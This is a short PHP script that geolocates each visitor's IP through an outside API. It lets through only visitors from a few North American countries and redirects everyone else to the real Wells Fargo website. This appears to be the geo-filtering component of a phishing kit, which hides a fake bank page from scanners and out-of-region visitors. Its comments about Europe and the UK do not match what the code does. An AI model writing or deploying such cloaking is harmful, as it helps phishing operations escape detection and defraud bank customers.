<?php
//Get user IP address
$ip=$_SERVER['REMOTE_ADDR'];
//Using the API to get information about this IP
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));
//Using the geoplugin to get the continent for this IP
//$continent=$details->geoplugin_continentCode;
//And for the country
$country=$details->geoplugin_countryCode;
//If continent is Europe
if($country ==="US" || $country ==="CA" || $country ==="MX"
    || $country ==="VI" || $country ==="VG"){
    // do nothing

}else{
    //Do action if country is in Europe , but its not UK
    exit(header('Location: https://www.wellsfargo.com'));
}
?>